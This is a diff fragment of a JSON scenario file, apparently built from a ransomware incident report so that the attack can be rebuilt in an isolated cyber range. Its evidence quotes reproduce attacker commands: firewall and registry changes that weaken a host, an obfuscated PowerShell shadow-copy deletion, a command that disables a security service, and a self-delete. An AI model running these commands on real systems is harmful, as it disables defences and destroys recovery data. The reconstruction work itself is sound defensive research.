+  },
+  {
+   "id": "evidence-82",
+   "quote": "cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\"\" new enable=Yes",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "18"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\"\" new enable=Yes"
+  },
+  {
+   "id": "evidence-83",
+   "quote": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "18"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
+  },
+  {
+   "id": "evidence-84",
+   "quote": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "18"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f"
+  },
+  {
+   "id": "evidence-85",
+   "quote": "cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f mountvol.exe A: \\\\?\\Volume{d7e47829-0000-0000-0000-100000000000}\\ mountvol.exe B: \\\\?\\Volume{d7e47829-0000-0000-0000-b0e213000000}\\ mountvol.exe E: \\\\?\\Volume{fce79ce0-b01f-11e6-b968-806e6f6e6963}\\",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "18"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f mountvol.exe A: \\\\?\\Volume{d7e47829 0000 0000 0000 "
+  },
+  {
+   "id": "evidence-86",
+   "quote": "cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del C:\\Users\\REM\\Desktop\\hybrid-9-8\\complex.exe",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "18"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c ping 1.1.1.1 n 10 > Nul & Del C:\\Users\\REM\\Desktop\\hybrid 9 8\\complex.exe"
+  },
+  {
+   "id": "evidence-87",
+   "quote": "powershell.exe $x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA HQALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA=='));Invoke-Expression $x",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "19"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "powershell.exe $x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA HQALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaA"
+  },
+  {
+   "id": "evidence-88",
+   "quote": "cmd.exe /c powershell -command \"$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "21"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c powershell command \"$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA B'+'lAGYA'+'ZQB'+'uAG'+'QA'));St"
+  }
+ ],
+ "missing_items": [
+  {
+   "id": "missing-hosts-h1-os-version",
+   "field": "Microsoft Exchange Server — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Microsoft Exchange Server 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h1 — Microsoft Exchange Server",
+    "action:a1 — gained access using a known Microsoft Exchange Server vulnerability"
+   ],
+   "suggestions": [
+    "請填原文或資產清單中的確切作業系統版本",
+    "Windows Server（build 待確認）",
+    "Linux 發行版（版本待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Microsoft Exchange Server",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-1",
+      "evidence-14"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h1-network",
+   "field": "Microsoft Exchange Server — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Microsoft Exchange Server 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h1 — Microsoft Exchange Server",
+    "action:a1 — gained access using a known Microsoft Exchange Server vulnerability"
+   ],
+   "suggestions": [
+    "隔離測試網段（只連必要主機）",
+    "內部網段（請描述允許來源）",
+    "對外 DMZ（只有原文/拓樸確認時才選）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Microsoft Exchange Server",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-1",
+      "evidence-14"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-os-version",
+   "field": "Windows host systems — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Windows host systems 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h2 — Windows host systems",
+    "action:a2 — deployed tools to move laterally across the network and escalate privileges",
+    "action:a3 — exfiltrated and encrypted files",
+    "action:a4 — left a ransom note in all directories where encryption occurs",
+    "action:a5 — ran executables from c:\\windows\\system32\\ and C:\\Windows\\",
+    "action:a6 — performed process injection on processes it creates",
+    "action:a7 — created scheduled tasks to launch ransomware and open ransom note",
+    "action:a8 — executed commands to stop services, disable services, and delete shadow copies",
+    "action:a9 — executed commands to modify firewall rules, registry settings, mount volumes, and query network and AD information"
+   ],
+   "suggestions": [
+    "Windows Server 2019（確切 build 待確認）",
+    "Windows Server 2016（確切 build 待確認）",
+    "Windows Server 2022（確切 build 待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Windows host systems",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-15",
+      "evidence-13",
+      "evidence-2",
+      "evidence-3",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11",
+      "evidence-12"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-network",
+   "field": "Windows host systems — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Windows host systems 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h2 — Windows host systems",
+    "action:a2 — deployed tools to move laterally across the network and escalate privileges",
+    "action:a3 — exfiltrated and encrypted files",
+    "action:a4 — left a ransom note in all directories where encryption occurs",
+    "action:a5 — ran executables from c:\\windows\\system32\\ and C:\\Windows\\",
+    "action:a6 — performed process injection on processes it creates",
+    "action:a7 — created scheduled tasks to launch ransomware and open ransom note",
+    "action:a8 — executed commands to stop services, disable services, and delete shadow copies",
+    "action:a9 — executed commands to modify firewall rules, registry settings, mount volumes, and query network and AD information"
+   ],
+   "suggestions": [
+    "內部／管理網段（候選；請確認允許來源）",
+    "隔離測試網段（只連必要主機）",
+    "其他網段（請描述區域與可達路徑）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Windows host systems",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-15",
+      "evidence-13",
+      "evidence-2",
+      "evidence-3",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11",
+      "evidence-12"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-action-a1-start-condition",
+   "field": "gained access using a known Microsoft Exchange Server vulnerability — 執行前置條件",
+   "category": "precondition",
+   "reason": "IR 沒有說明這個情境的起始存取狀態；不假設攻擊者已經有立足點。",
+   "severity": "major",
+   "status": "open",
+   "question": "情境從「gained access using a known Microsoft Exchange Server vulnerability」開始。執行這一步前需要哪個已知帳號、服務或其他狀態？若來源沒有說明，請選擇直接從此步驟開始或保留未知。",
+   "affects": [
+    "action:a1 — gained access using a known Microsoft Exchange Server vulnerability"
+   ],
+   "suggestions": [
+    "直接從這一步開始重現（前置條件不重建）",
+    "補上來源明確記載的前置條件",
+    "保留未知"
+   ],
+   "known": [
+    {
+     "field": "IR 起始步驟",
+     "value": "gained access using a known Microsoft Exchange Server vulnerability",
+     "source_ref": "actions:a1.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-1"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "missing-gap-exploited-weakness",
+   "field": "被利用的弱點（CVE／弱點類型）",
+   "category": "software",
+   "reason": "步驟描述了弱點利用，但 IR 沒有弱點編號或弱點類型；沒有它就無法選定可重現的版本與驗證方式。",
+   "severity": "major",
+   "status": "open",
+   "question": "這些步驟利用的是哪個產品的哪個弱點？目前已知目標軟體：Microsoft Exchange Server。請提供 CVE 編號或弱點類型；若來源沒有寫，請明確選擇教學用的替代弱點並標記為假設。",
+   "affects": [
+    "action:a1 — gained access using a known Microsoft Exchange Server vulnerability",
+    "action:a6 — performed process injection on processes it creates",
+    "host:h1 — Microsoft Exchange Server",
+    "host:h2 — Windows host systems"
+   ],
+   "suggestions": [
+    "填入來源或其他公開資料記載的 CVE（請註明出處）",
+    "選用靶場已有的漏洞練習標的並標記為假設",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "相關步驟",
+     "value": "gained access using a known Microsoft Exchange Server vulnerability",
+     "source_ref": "actions:a1.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-1"
+     ]
+    },
+    {
+     "field": "相關步驟",
+     "value": "performed process injection on processes it creates",
+     "source_ref": "actions:a6.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-6"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "missing-gap-database-product",
+   "field": "資料庫產品、版本與所在主機",
+   "category": "software",
+   "reason": "步驟查詢或存取了資料庫，但 IR 沒有資料庫產品、版本，也沒有它位於哪台主機。",
+   "severity": "major",
+   "status": "open",
+   "question": "被查詢的資料庫是哪個產品、哪個版本、放在哪台主機上？來源沒寫的話請選擇教學用的替代資料庫並標記為替代。",
+   "affects": [
+    "action:a9 — executed commands to modify firewall rules, registry settings, mount volumes, and query network and AD information",
+    "host:h2 — Windows host systems"
+   ],
+   "suggestions": [
+    "填入來源或資產清單記載的資料庫產品與版本",
+    "選用靶場可取得的替代資料庫並標記為替代",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "相關步驟",
+     "value": "executed commands to modify firewall rules, registry settings, mount volumes, and query network and AD information",
+     "source_ref": "actions:a9.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-12"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "missing-gap-exfiltration-path",
+   "field": "資料外傳的通道與靶場接收端",
+   "category": "network",
+   "reason": "步驟把資料帶出環境，但 IR 沒有外傳的協定、目的地與資料種類，靶場也沒有受控的接收端。",
+   "severity": "major",
+   "status": "open",
+   "question": "資料是用什麼協定、傳到哪裡、傳了哪一類資料？靶場要用哪個受控的接收端（不得連到外部網路）？",
+   "affects": [
+    "action:a3 — exfiltrated and encrypted files",
+    "host:h2 — Windows host systems"
+   ],
+   "suggestions": [
+    "只傳到隔離靶場內的模擬接收端",
+    "封鎖外連並將此步驟標記未重現",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "相關步驟",
+     "value": "exfiltrated and encrypted files",
+     "source_ref": "actions:a3.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-3"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "planner_dep_software-microsoft-exchange-server",
+   "field": "software dependency: Microsoft Exchange Server",
+   "category": "software",
+   "reason": "Microsoft Exchange Server is not in the inventory and no substitute matches; not reproducible.",
+   "severity": "major",
+   "status": "open",
+   "service_ref": "s1",
+   "question": "目錄沒有可部署的 Microsoft Exchange Server。要用哪個元件當教學替代？也可以選擇不部署並保留為未重現。",
+   "suggestions": [
+    "不部署；此軟體相關步驟標記為未重現"
+   ]
+  },
+  {
+   "id": "planner_dep_software-exchange-server",
+   "field": "software dependency: Exchange Server",
+   "category": "software",
+   "reason": "Exchange Server is not in the inventory and no substitute matches; not reproducible.",
+   "severity": "major",
+   "status": "open"
+  }
+ ],
+ "quality": {
+  "quote_verified_rate": 0.9773,
+  "unsupported_claim_count": 4,
+  "inferred_count": 4,
+  "absent_count": 0,
+  "method": "single_pass",
+  "provisional": true,
+  "dropped_placeholder_hosts": 0,
+  "excluded_non_attacker_actions": [],
+  "hedged_action_count": 1,
+  "capability_action_count": 0,
+  "dropped_non_software_services": [],
+  "dropped_misplaced_techniques": []
+ },
+ "id": "scn_evidence",
+ "fidelity": "needs_vm"
+}
